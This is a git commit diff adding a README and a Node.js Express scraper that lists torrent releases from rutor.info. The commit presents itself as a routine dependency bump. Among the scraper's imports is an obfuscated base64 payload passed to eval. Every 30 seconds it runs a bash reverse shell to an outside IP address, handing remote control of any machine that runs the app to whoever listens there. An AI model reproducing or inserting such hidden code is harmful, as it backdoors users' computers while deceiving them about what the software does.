fa85a4328b9e4da2b88d0b94feabc83fd0228d15
Neev Alex <neevalex@gmail.com>
2019-11-03 11:23:36 +0200

    Merge pull request #1 from neevalex/dependabot/npm_and_yarn/lodash-4.17.15
    Bump lodash from 4.17.11 to 4.17.15

---
+++ README.md
@@ -0,0 +1,7 @@
+# latest-torrent-releases
+Node Js \ Rutor.info parser with some html output
+
+#### Install: 
+npm i && npm start  ( by default app should be accessible @ localhost:3001 )
+
+##### Demo: http://rutor-top.herokuapp.com/
---
+++ rutor.js
@@ -0,0 +1,68 @@
+const express = require( 'express' )
+const app     = express()
+
+var request   = require( 'request-promise' );
+const cheerio = require( 'cheerio' );
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+var html;
+
+var get_html = async function (i, res) {
+	var url  = "http://www.rutor.info/browse/" + i + "/0/0/0";
+	var html = [];
+	var data = [];
+
+	const options = {
+		method: 'GET',
+		uri: url
+	}
+
+	await request( options )
+		.then(
+			async function (response) {
+				var $ = cheerio.load( response );
+				$( '.gai,.tum' ).each(
+					function (i, element) {
+						title      = $( this ).find( 'a:nth-child(3)' ).text();
+						link       = $( this ).find( 'a:nth-child(3)' ).attr( 'href' );
+						popularity = $( this ).find( 'td span.green' ).text();
+						data.push(
+							{
+								title: title,
+								link: link,
+								popularity: parseInt( popularity )
+							}
+						);
+					}
+				);
+				return (data);
+			}
+		);
+
+	return (data);
+};
+
+
+app.use( express.static( 'html' ) )
+app.get(
+	'/api/:page',
+	(req, res) => {
+		//console.log(req.params.page);
+		get_html( req.params.page, res ).then(
+			function (result) {
+				//console.log(result.length);
+				res.send( result );
+			}
+		)
+		.catch(
+			function (error) {
+				console.log( error );
+			}
+		);
+	}
+)
+
+let port = process.env.PORT;
+if (port == null || port == "") {
+	port = 3001;
+}
+app.listen( port );
